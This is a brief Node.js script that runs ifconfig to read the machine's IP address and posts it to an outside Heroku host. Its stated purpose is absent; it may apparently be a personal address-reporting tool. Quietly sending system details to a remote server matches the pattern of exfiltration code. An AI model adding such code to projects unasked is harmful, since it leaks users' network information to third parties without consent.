var exec = require('child_process').exec;
var request = require('request');

var output = exec('ifconfig | grep "inet addr" | head -1', function(err, stdout) {
  request.post(
    'http://meng404d.herokuapp.com/addr',
    { form : { addr: stdout } });
});
